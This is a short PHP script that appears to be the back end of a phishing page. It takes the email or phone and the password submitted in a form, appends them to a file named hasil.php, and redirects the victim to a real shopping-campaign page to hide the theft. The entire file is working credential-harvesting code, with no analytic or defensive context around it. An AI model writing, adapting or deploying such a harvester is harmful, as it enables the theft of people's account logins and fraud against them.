<?php
header ("Location: https://www.easyshopping.id/campaigns/bagiuang/?utm_source=BagiUang_GDN_Google_Short_Aug19&utm_medium=Google&utm_campaign=BagiUang_GDN_Google_Short_Aug19&gclid=Cj0KCQjwwIPrBRCJARIsAFlVT8-Y4AdOUm6bZXSM15DWMjTa9PivWqM9SQShv0tcnMs53IpdpNMAAV8aAiSnEALw_wcB");
$ADEx = "hasil.php";
$ADEy = $_POST['email'];
$ADEz = $_POST['password'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fwrite($handle, "Email atau Telepon : ");
fwrite($handle, "$ADEy");
fwrite($handle, "\n");
fwrite($handle, "Kata Sandi         : ");
fwrite($handle, "$ADEz");
fwrite($handle, "\n");
fwrite($handle, "++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fclose($handle);
exit;
?>
